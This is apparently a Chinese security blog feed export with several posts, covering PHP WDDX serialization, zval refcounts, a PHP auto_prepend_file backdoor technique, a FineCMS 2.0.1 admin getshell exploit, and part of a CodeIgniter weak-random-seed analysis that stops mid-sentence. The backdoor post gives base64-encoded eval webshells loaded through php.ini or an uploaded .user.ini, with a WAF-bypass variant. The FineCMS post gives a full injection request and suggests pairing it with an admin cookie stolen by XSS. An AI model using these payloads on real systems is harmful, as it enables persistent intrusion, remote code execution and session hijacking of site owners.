<p>演示代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">/**</span></div><div class="line"><span class="comment">* User: LonelyRain</span></div><div class="line"><span class="comment">*/</span></div><div class="line"></div><div class="line">$a = [<span class="string">"foo"</span>];</div><div class="line">$a[<span class="number">1</span>] =&amp; $a[<span class="number">0</span>];</div><div class="line"></div><div class="line"><span class="keyword">echo</span> wddx_serialize_value($a);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>结果：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;wddxPacket version=<span class="string">'1.0'</span>&gt;&lt;header/&gt;&lt;data&gt;&lt;<span class="keyword">array</span> length=<span class="string">'2'</span>&gt;&lt;string&gt;foo&lt;/string&gt;&lt;string&gt;foo&lt;/string&gt;&lt;/<span class="keyword">array</span>&gt;&lt;/data&gt;&lt;/wddxPacket&gt;</div></pre></td></tr></table></figure></p>
<p>可以看到才用wddx_serialize_value()函数处理的$a和之前使用serialize()函数处理的值都被保存下来了，只不过遵守的格式有着相应的区别。</p>
<p>WDDX序列化反序列化相关函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">wddx_serialize_value:    将单一值连续化。</div><div class="line">wddx_serialize_vars :    将多值连续化。</div><div class="line">wddx_packet_start   :    开始新的 WDDX 封包。</div><div class="line">wddx_packet_end     :    结束的 WDDX 封包。</div><div class="line">wddx_add_vars       :    将 WDDX 封包连续化。</div><div class="line">wddx_deserialize    :    将 WDDX 封包解连续化。</div></pre></td></tr></table></figure>
<p>这一篇主要讲了序列化后数据的格式，下一次会写PHP序列化中一块重要的内容，PHP的魔术方法等内容。</p>
<p>Reference:</p>
<p><a href="http://www.phpinternalsbook.com/classes_objects/serialization.html" target="_blank" rel="external">PHP内核</a><br><a href="https://github.com/80vul/phpcodz/blob/master/research/pch-010.md" target="_blank" rel="external">PHP string序列化与反序列化语法解析不一致带来的安全隐患</a><br><a href="http://www.t086.com/code/php/group.php-51.php" target="_blank" rel="external">PHP中文手册</a></p>
]]></content>
      
        <categories>
            
            <category> PHP </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Zval中的refcount问题]]></title>
      <url>/2017/10/10/zval-refcount/</url>
      <content type="html"><![CDATA[<p>今天群里面的一位小伙伴问我关于PHP变量中refcount的问题，当时回答给他了，发现自己没注意到一个细节，记录下来。</p>
<a id="more"></a>
<h2 id="什么是refcount"><a href="#什么是refcount" class="headerlink" title="什么是refcount"></a>什么是refcount</h2><p>“zval结构体中有四个字段，其含义分别为：</p>
<p>属性名    含义    默认值<br>refcount<strong>gc    表示引用计数    1<br>is_ref</strong>gc    表示是否为引用    0<br>value    存储变量的值<br>type    变量具体的类型”</p>
<p>摘录来自: Reeze Xia. “TIPI: 深入理解PHP内核”。</p>
<p>refcount是php用来对zval变量引用次数技术的一个变量值。</p>
<p>它是一个计数器，用来保存有多少符号表有多少符号指向该zval。在变量生成时，其refcount=1，赋值操作$a = $b会令zval的refcount加1，zval的refcount如果减少到0，会释放该zval所占的内存空间。</p>
<p>##问题是什么？<br>小伙伴原问题是为什么下面的计数会是3.<br><img src="/old/2017/10/10/zval-refcount/1704455592.jpg" alt="E0B61238BF90638ECF0A713DC1169A3D.jpg"></p>
<p>因为照上面的说法zval $a在被赋值为100的时候应该为1，$b = $a 的时候应该再加1，那么debug_zval_dump()函数照理来说应该显示2，而不应该显示3。</p>
<p>当时我的回答是，初始化的时候值为1，赋值的时候再加1，赋值给$b的时候再加1，所以是3。<br>但是后来他提出，使用xdebug_zval_dump()出来refcount的值是2。<br>那么，我之前的答案就是错的，惭愧，学艺不精。</p>
<p>于是我找了一些资料来研究两个函数之间处理的差异。</p>
<p>下面就是差异的原因。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">PHP<span class="string">'s debug_zval_dump takes a variable as argument for analysis and is thus also bound to the same splitting rules as outlined earlier. This means that'</span>s not really well suited <span class="keyword">for</span> dumping a zval<span class="string">'s internal structure as it would always modify the zval. Besides adding 1 to the refcount field, it could also force a split resulting in unexpected output:</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">&lt;?php</span></div><div class="line"><span class="string">$a = 42;</span></div><div class="line"><span class="string">debug_zval_dump($a);</span></div><div class="line"><span class="string">?&gt;</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">shows:</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">long(42) refcount(2)</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">Xdebug has a similar function to display a zval'</span>s internal data: xdebug_debug_zval. This <span class="function"><span class="keyword">function</span> <span class="title">does</span> <span class="title">requires</span> <span class="title">not</span> <span class="title">a</span> <span class="title">variable</span> <span class="title">to</span> <span class="title">be</span> <span class="title">passed</span> <span class="title">as</span> <span class="title">its</span> <span class="title">argument</span>, <span class="title">but</span> <span class="title">instead</span> <span class="title">requires</span> <span class="title">a</span> <span class="title">variable</span> <span class="title">name</span> <span class="title">to</span> <span class="title">be</span> <span class="title">passed</span> <span class="title">in</span>. <span class="title">With</span> <span class="title">this</span>, <span class="title">the</span> <span class="title">manipulation</span> <span class="title">of</span> <span class="title">the</span> <span class="title">zval</span> <span class="title">is</span> <span class="title">avoided</span> <span class="title">and</span> <span class="title">the</span> <span class="title">proper</span> <span class="title">values</span> <span class="title">are</span> <span class="title">shown</span>:</span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function">&lt;?<span class="title">php</span></span></div><div class="line">$a = 42;</div><div class="line">xdebug_debug_zval(<span class="string">'a'</span>);</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line">which shows:</div><div class="line"></div><div class="line">a: (refcount=<span class="number">1</span>, is_ref=<span class="number">0</span>)=<span class="number">42</span></div></pre></td></tr></table></figure>
<p>所以单纯的<code>$a</code>的refcount＝0,赋值操作会+1。</p>
]]></content>
      
        <categories>
            
            <category> PHP </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[PHP自动文件扩展安全研究]]></title>
      <url>/2017/10/10/PHP%E8%87%AA%E5%8A%A8%E6%96%87%E4%BB%B6%E6%89%A9%E5%B1%95%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/</url>
      <content type="html"><![CDATA[<p>今天在看TIPI的时候读到了$PHP_SRC/main/php_globals.h里面全局变量宏中全局变量是通过php.ini来加载赋值的。<br>里面有两个值[图1]<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">char</span> *auto_append_file;</div><div class="line"><span class="keyword">char</span> *auto_prepend_file;</div></pre></td></tr></table></figure></p>
<p>这两个可以在主文件之前自动解析。<br>那么就可以通过增加这两个值实现在其他文件夹放入我们的后门文件，并且在网站的任何一个目录用这个后门.</p>
<a id="more"></a>
<p><img src="/old/2017/10/10/PHP自动文件扩展安全研究/4247952283.png" alt="图1"></p>
<p>php.ini中<br>增加<br>auto_prepend_file = “/path/to/your/file”</p>
<p>假设我们放的是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">system(<span class="string">'la -al'</span>)</div></pre></td></tr></table></figure></p>
<p>网站任意页面都会执行这段代码</p>
<p><img src="/old/2017/10/10/PHP自动文件扩展安全研究/732587363.png" alt="5E8CAD57-CC76-4579-9DE4-208BC28728D6.png"></p>
<p>和t00ls上朋友讨论，还可以配合</p>
<p><code>allow_url_include=On</code><br>这个选项来无需文件，直接使用PHP的封装器来包括一句话。</p>
<p>那位朋友给出的方案是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">allow_url_include=On</div><div class="line">auto_prepend_file=<span class="string">"data:;base64,PD9waHAgQGV2YWwoJF9SRVFVRVNUW2NtZF0pOz8+"</span></div></pre></td></tr></table></figure></p>
<p>其中base64解码出来的是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_REQUEST[cmd]);<span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>个人感觉的话用$_REQUEST不太好，还可以改进一下。<br>用<code>php://input</code>比较好。</p>
<p>因为如果用<code>php://input</code>的话，是可以用来绕过一部分waf的。</p>
<p>所以我给出来的方案是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">allow_url_include=On</div><div class="line">auto_prepend_file = <span class="string">"data:;base64,PD9waHAgQGV2YWwoZmlsZV9nZXRfY29udGVudHMoJ3BocDovL2lucHV0JykpOw=="</span></div></pre></td></tr></table></figure></p>
<p>测试<br><img src="/old/2017/10/10/PHP自动文件扩展安全研究/1646402056.png" alt="E73106EC-02A0-430F-8877-796CB797481C.png"><br>可以注意到用没有出现在RFC协议中的HTTP METHOD也可以代码执行了:)</p>
<p>还有一个想法就是，假设有一个文件上传，限定了不能上传除了jpg的其它文件，可以通过上传一个.htaccess覆盖auto_prepend_file变量，再把机器DDOS重启，从而getshell</p>
<p>========更新2========<br>.htaccess应该是不行的，原因如下：<br>Using php_flag or php_value in .htaccess files</p>
<p>Some PHP scripts suggest using “php_value” or “php_flag” commands in .htaccess files, as in this example:</p>
<p>php_value  include_path         “.:/usr/local/lib/php”<br>php_flag   display_errors       Off<br>php_value  upload_max_filesize  2M<br>However, our servers run PHP in “CGI mode” as recommended by the PHP developers (not as an Apache module), so you can’t use “php_value” or “php_flag” commands in .htaccess files. If you try to do so, you’ll see an “internal server error” message.</p>
<p>You can modify your php.ini file to get the same effect, though. In fact, modifying php.ini is actually more flexible than using php_value or php_flag: there are many things you can’t override using .htaccess files, but you can override almost any PHP setting in the php.ini file.</p>
<p>See our PHP support page for instructions on modifying php.ini. To get the same effect as the .htaccess lines above, you would simply add these lines to your custom php.ini file:</p>
<p>include_path = “.:/usr/local/lib/php”<br>display_errors = Off<br>upload_max_filesize = 2M</p>
<p>========更新3========<br>经过测试，上传.user.ini<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">allow_url_include=On</div><div class="line">auto_prepend_file = <span class="string">"data:;base64,PD9waHAgQGV2YWwoZmlsZV9nZXRfY29udGVudHMoJ3BocDovL2lucHV0JykpOw=="</span></div></pre></td></tr></table></figure></p>
<p>包含以上的是可以getshell的，当前（目录下的任意文件可以命令执行）</p>
]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Backdoor </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[FineCMS 2.0.1 后台GETSHELL 0Day]]></title>
      <url>/2017/10/10/FineCMS2-0-1%E5%90%8E%E5%8F%B0GETSHELL/</url>
      <content type="html"><![CDATA[<p>FineCMS有一个缓存功能，和当初Wordpress一样，有一个缓存功能，并且缓存的文件名不是随机的并且后缀是php，就导致了可以利用后台缓存功能来getshell。</p>
<p>下面是Payload</p>
<a id="more"></a>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">POST /index.php?s=admin&amp;c=category&amp;a=edit&amp;catid=13 HTTP/1.1</div><div class="line">Host: finecms2.0.1</div><div class="line">Content-Length: 813</div><div class="line">Cache-Control: max-age=0</div><div class="line">Origin: http://finecms2.0.1</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</div><div class="line">Referer: http://finecms2.0.1/index.php?s=admin&amp;c=category&amp;a=edit&amp;catid=13</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en;q=0.6</div><div class="line">Cookie: finecms_b1bf4_member_id=1; finecms_b1bf4_member_code=5bd1ebd88ad1c863ecc2; cod=10; csd=13; finecms_b1bf4_ci_session=a%3A7%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%221f2b4dc45dd971bb0cd46febe32f5967%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A9%3A%22127.0.0.1%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A120%3A%22Mozilla%2F5.0+%28Macintosh%3B+Intel+Mac+OS+X+10_11_5%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F51.0.2704.106+Safari%2F537.3%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1468985849%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3Bs%3A17%3A%22error_admin_login%22%3Bi%3A5%3Bs%3A7%3A%22user_id%22%3Bs%3A1%3A%221%22%3B%7D0edaafa3cae30c09ebb401c1ff2d76dd80c0ec91</div><div class="line">Connection: close</div><div class="line"></div><div class="line">catid=13&amp;typeid=2&amp;data%5Bparentid%5D=10&amp;data%5Bcatname%5D=123&amp;data%5Bcatdir%5D=123&amp;setting%5Bdocument%5D=&amp;data%5Bimage%5D=&amp;data%5Bismenu%5D=1&amp;data%5Burlpath%5D=&amp;abc=10&amp;data%5Bpagesize%5D=20&amp;data%5Bcategorytpl%5D=&amp;data%5Blisttpl%5D=&amp;data%5Bshowtpl%5D=page.html&amp;data%5Bmeta_title%5D=&amp;data%5Bmeta_keywords%5D=&amp;data%5Bmeta_description%5D=&amp;setting%5Bverifypost%5D=0&amp;setting%5Badminpost%5D=0&amp;setting%5Bmemberpost%5D=0&amp;setting%5Bguestpost%5D=0&amp;setting%5Bguestpost%5D=&amp;setting%5Burl%5D%5Buse%5D=0&amp;setting%5Burl%5D%5Btohtml%5D=0&amp;setting%5Burl%5D%5Bhtmldir%5D=html&amp;setting%5Burl%5D%5Blist%5D=&amp;setting%5Burl%5D%5Blist_page%5D=&amp;setting%5Burl%5D%5Bshow%5D=&amp;setting%5Burl%5D%5Bshow_page%5D=&amp;setting%5Burl%5D%5Bcatjoin%5D=%2F&amp;submit=%E6%8F%90%E4%BA%A4&amp;data%5Bcontent%5D=%3Cp%3E%0D%0A%09&quot;&#125;//%0D</div><div class="line">&lt;?php phpinfo();?&gt;</div><div class="line">%0D//&#123;&quot;%3C%2Fp%3E</div></pre></td></tr></table></figure>
<p>把phpinfo();换成一句话，cookie换成XSS打到的管理员的就好。</p>
]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 漏洞分析 </tag>
            
            <tag> 伪随机数 </tag>
            
            <tag> CodeIgniter </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CodeIgniter伪随机数导致加密失效]]></title>
      <url>/2017/10/10/CodeIgniter-Vul/</url>
      <content type="html"><![CDATA[<p>首先来看一段CI内核在开启session储存在数据库选项的时候的操作.也就是</p>
<p>/system/core/config.php</p>
<p>内核配置文件设置为以下的时候</p>
<p><code>$config[&#39;sess_use_database&#39;]    = true;</code></p>
<a id="more"></a>
<p>/system/libraries/Session/session.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($params = array<span class="params">()</span>)</span></span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"></div><div class="line">log_message(<span class="string">'debug'</span>, <span class="string">"Session Class Initialized"</span>);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Set the super object to a local variable for use throughout the class</span></div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;CI =&amp; get_instance();</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">if (defined('ci_session')) &#123;</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">return $this-&gt;CI-&gt;session;</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">&#125; else &#123;</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">define('ci_session', 1);</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">&#125;</span></div><div class="line"><span class="comment"></span></div><div class="line"><span class="comment">*/</span></div><div class="line"></div><div class="line"><span class="comment">// Set all the session preferences, which can either be set</span></div><div class="line"></div><div class="line"><span class="comment">// manually via the $params array above or via the config file</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'sess_encrypt_cookie'</span>, <span class="string">'sess_use_database'</span>, <span class="string">'sess_table_name'</span>, <span class="string">'sess_expiration'</span>, <span class="string">'sess_expire_on_close'</span>, <span class="string">'sess_match_ip'</span>, <span class="string">'sess_match_useragent'</span>, <span class="string">'sess_cookie_name'</span>, <span class="string">'cookie_path'</span>, <span class="string">'cookie_domain'</span>, <span class="string">'cookie_secure'</span>, <span class="string">'sess_time_to_update'</span>, <span class="string">'time_reference'</span>, <span class="string">'cookie_prefix'</span>, <span class="string">'encryption_key'</span>) <span class="keyword">as</span> $key)</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;$key = (<span class="keyword">isset</span>($params[$key])) ? $params[$key] : <span class="keyword">$this</span>-&gt;CI-&gt;config-&gt;item($key);</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;encryption_key == <span class="string">''</span>)</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;encryption_key == <span class="string">'finecms190'</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Load the string helper so we can use the strip_slashes() function</span></div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;CI-&gt;load-&gt;helper(<span class="string">'string'</span>);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Do we need encryption? If so, load the encryption class</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;sess_encrypt_cookie == <span class="keyword">TRUE</span>)</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;CI-&gt;load-&gt;library(<span class="string">'encrypt'</span>);</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Are we using a database?  If so, load it</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;sess_use_database === <span class="keyword">TRUE</span> <span class="keyword">AND</span> <span class="keyword">$this</span>-&gt;sess_table_name != <span class="string">''</span>)</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;CI-&gt;load-&gt;database();</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Set the "now" time.  Can either be GMT or server time, based on the</span></div><div class="line"></div><div class="line"><span class="comment">// config prefs.  We use this to set the "last activity" time</span></div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;now = <span class="keyword">$this</span>-&gt;_get_time();</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Set the session length. If the session expiration is</span></div><div class="line"></div><div class="line"><span class="comment">// set to zero we'll set the expiration two years from now.</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;sess_expiration == <span class="number">0</span>)</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;sess_expiration = (<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">365</span>*<span class="number">2</span>);</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Set the cookie name</span></div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;sess_cookie_name = <span class="keyword">$this</span>-&gt;cookie_prefix.<span class="keyword">$this</span>-&gt;sess_cookie_name;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Run the Session routine. If a session doesn't exist we'll</span></div><div class="line"></div><div class="line"><span class="comment">// create a new one.  If it does, we'll update it.</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> ( ! <span class="keyword">$this</span>-&gt;sess_read())</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;sess_create();</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">else</span></div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;sess_update();</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Delete 'old' flashdata (from last request)</span></div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;_flashdata_sweep();</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Mark all new flashdata as old (data will be deleted before next request)</span></div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;_flashdata_mark();</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">// Delete expired sessions if necessary</span></div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;_sess_gc();</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">log_message(<span class="string">'debug'</span>, <span class="string">"Session routines successfully run"</span>);</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>简单的用大白话来说，这段代码就是用来做一些对Session 的初始工作，检测配置，检测cookie是否设置等，检测配置最后有这个函数_sess_gc().这是每次请求的时候都会运行到的。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">_sess_gc</span><span class="params">()</span></span></div><div class="line"><span class="function"></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;sess_use_database != <span class="keyword">TRUE</span>)</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="keyword">return</span>;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">srand(time());</div><div class="line"></div><div class="line"><span class="keyword">if</span> ((rand() % <span class="number">100</span>) &lt; <span class="keyword">$this</span>-&gt;gc_probability)</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line">$expire = <span class="keyword">$this</span>-&gt;now - <span class="keyword">$this</span>-&gt;sess_expiration;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;CI-&gt;db-&gt;where(<span class="string">"last_activity &lt; &#123;$expire&#125;"</span>);</div><div class="line"></div><div class="line"><span class="keyword">$this</span>-&gt;CI-&gt;db-&gt;delete(<span class="keyword">$this</span>-&gt;sess_table_name);</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">log_message(<span class="string">'debug'</span>, <span class="string">'Session garbage collection performed.'</span>);</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>可以看到这里首先检测了是否开启了数据库储存session，如果开启就会以当前的时间设置一个种子。大家可能觉得没有什么问题</p>
<p>首先我先介绍一下一个特性，我们在发送HTTP给PHP-CGI的时候</p>
<p><img src="/old/2017/10/10/CodeIgniter-Vul/1046971727.png" alt="85D4315C-97CC-4B00-8857-BCD997B78171.png"></p>
<p>这个请求对应的返回的时间戳，是php先生成的。</p>
<p>假如当前是 10:00</p>
<p>php代码是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">echo</span> <span class="string">"start"</span>;</div><div class="line"></div><div class="line">sleep(<span class="number">5</span>);</div><div class="line"></div><div class="line"><span class="comment">//Insert some code.</span></div><div class="line"></div><div class="line"><span class="keyword">echo</span> <span class="string">"pause"</span>;</div><div class="line"></div><div class="line">sleep(<span class="number">10</span>)</div></pre></td></tr></table></figure>
<p>大家可能觉得返回的时间戳是请求接受到的时间+处理的时间。10:15</p>
<p>实际上应该就是请求接收到的时间。</p>
<p>为什么我要说这个呢？</p>
<p>因为CI的框架本身代码执行时间就是等于返回的时间戳的时间。所以在运行到</p>
